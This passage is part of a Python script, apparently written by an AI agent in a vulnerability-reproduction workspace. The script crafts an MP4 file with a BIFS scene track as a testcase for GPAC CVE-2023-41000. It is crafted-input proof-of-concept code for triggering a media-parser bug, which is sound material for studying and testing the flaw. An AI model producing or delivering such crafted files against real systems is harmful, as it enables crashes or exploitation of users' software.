n    es_desc = io.BytesIO()\n    es_desc.write(struct.pack(\'>H\', 1))  # ES_ID\n    es_desc.write(b\'\\x00\')  # flags\n    \n    # DecoderConfigDescriptor\n    dec_config = io.BytesIO()\n    dec_config.write(b\'\\x01\')  # objectTypeIndication (BIFS v1)\n    dec_config.write(b\'\\x0d\')  # streamType (scene = 0x03) << 2 | upStream(0) << 1 | reserved(1)\n    dec_config.write(b\'\\x00\\x00\\x15\')  # bufferSizeDB (24-bit)\n    dec_config.write(struct.pack(\'>I\', 64000))  # maxBitrate\n    dec_config.write(struct.pack(\'>I\', 0))  # avgBitrate\n    \n    # DecoderSpecificInfo (minimal BIFS config)\n    dec_specific = b\'\\x00\'  # minimal config\n    dec_config.write(b\'\\x05\')  # DecoderSpecificInfo tag\n    dec_config.write(bytes([len(dec_specific)]))\n    dec_config.write(dec_specific)\n    \n    # Encode DecoderConfigDescriptor\n    dec_config_data = dec_config.getvalue()\n    es_desc.write(b\'\\x04\')  # DecoderConfigDescriptor tag\n    es_desc.write(bytes([len(dec_config_data)]))\n    es_desc.write(dec_config_data)\n    \n    # SLConfigDescriptor\n    sl_config = b\'\\x02\'  # predefined = 2\n    es_desc.write(b\'\\x06\')  # SLConfigDescriptor tag\n    es_desc.write(bytes([len(sl_config)]))\n    es_desc.write(sl_config)\n    \n    # Encode ES_Descriptor\n    es_desc_data = es_desc.getvalue()\n    esd_data.write(b\'\\x03\')  # ES_DescrTag\n    es_desc_data_len = len(es_desc_data)\n    esd_data.write(bytes([es_desc_data_len]))\n    esd_data.write(es_desc_data)\n    \n    # Create esds box\n    esd_box = write_full_box(\'esds\', 0, 0, esd_data.getvalue())\n    bifs_entry.write(esd_box)\n    \n    # Fix sample entry size\n    bifs_entry_data = bifs_entry.getvalue()\n    bifs_entry_size = len(bifs_entry_data)\n    bifs_entry_data = struct.pack(\'>I\', bifs_entry_size) + bifs_entry_data[4:]\n    \n    # stsd box\n    data = struct.pack(\'>I\', 1) + bifs_entry_data\n    return write_full_box(\'stsd\', 0, 0, data)\n\ndef create_stts():\n    """Create stts box (time-to-sample)"""\n    data = struct.pack(\'>III\', 1, 1, 1000)\n    return write_full_box(\'stts\', 0, 0, data)\n\ndef create_stsc():\n    """Create stsc box (sample-to-chunk)"""\n    data = struct.pack(\'>IIII\', 1, 1, 1, 1)\n    return write_full_box(\'stsc\', 0, 0, data)\n\ndef create_stsz(sample_size):\n    """Create stsz box (sample size)"""\n    data = struct.pack(\'>III\', 0, 1, sample_size)\n    return write_full_box(\'stsz\', 0, 0, data)\n\ndef create_stco(offset):\n    """Create stco box (chunk offset)"""\n    data = struct.pack(\'>II\', 1, offset)\n    return write_full_box(\'stco\', 0, 0, data)\n\ndef create_mdat(bifs_data):\n    """Create mdat box with BIFS command data"""\n    return write_box(\'mdat\', bifs_data)\n\ndef create_mp4():\n    """Create complete MP4 file"""\n    output = io.BytesIO()\n    \n    # BIFS command data - simple scene replace command\n    # Format: type(2 bits) | ... | go(1 bit)\n    # Type 3 = SceneReplace, go=0 (no more commands)\n    bifs_data = b\'\\xC0\'  # 11000000 = type 3 (SceneReplace), then some data, go=0\n    \n    # Write ftyp\n    output.write(create_ftyp())\n    \n    # Build moov box content\n    moov_data = io.BytesIO()\n    moov_data.write(create_mvhd())\n    \n    # Build trak box\n    trak_data = io.BytesIO()\n    trak_data.write(create_tkhd(1))\n    \n    # Build mdia box\n    mdia_data = io.BytesIO()\n    mdia_data.write(create_mdhd())\n    mdia_data.write(create_hdlr())\n    \n    # Build minf box\n    minf_data = io.BytesIO()\n    minf_data.write(create_nmhd())\n    minf_data.write(write_box(\'dinf\', create_dref()))\n    \n    # Build stbl box\n    stbl_data = io.BytesIO()\n    stbl_data.write(create_stsd_bifs())\n    stbl_data.write(create_stts())\n    stbl_data.write(create_stsc())\n    stbl_data.write(create_stsz(len(bifs_data)))\n    stbl_data.write(create_stco(0))  # placeholder\n    \n    minf_data.write(write_box(\'stbl\', stbl_data.getvalue()))\n    mdia_data.write(write_box(\'minf\', minf_data.getvalue()))\n    trak_data.write(write_box(\'mdia\', mdia_data.getvalue()))\n    moov_data.write(write_box(\'trak\', trak_data.getvalue()))\n    \n    # Write moov box\n    moov_box = write_box(\'moov\', moov_data.getvalue())\n    output.write(moov_box)\n    \n    # Calculate mdat offset\n    mdat_offset = output.tell() + 8\n    \n    # Write mdat\n    output.write(create_mdat(bifs_data))\n    \n    # Fix stco offset\n    mp4_data = output.getvalue()\n    stco_pos = mp4_data.find(b\'stco\')\n    if stco_pos > 0:\n        offset_pos = stco_pos + 16\n        mp4_data = mp4_data[:offset_pos] + struct.pack(\'>I\', mdat_offset) + mp4_data[offset_pos + 4:]\n    \n    return mp4_data\n\noutput_path = \'/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2023-41000/round4/testcase-round4\'\nmp4_data = create_mp4()\n\nwith open(output_path, \'wb\') as f:\n    f.write(mp4_data)\n\nprint(f"Generated testcase at {output_path}")\nprint(f"Size: {len(mp4_data)} bytes")\n'}
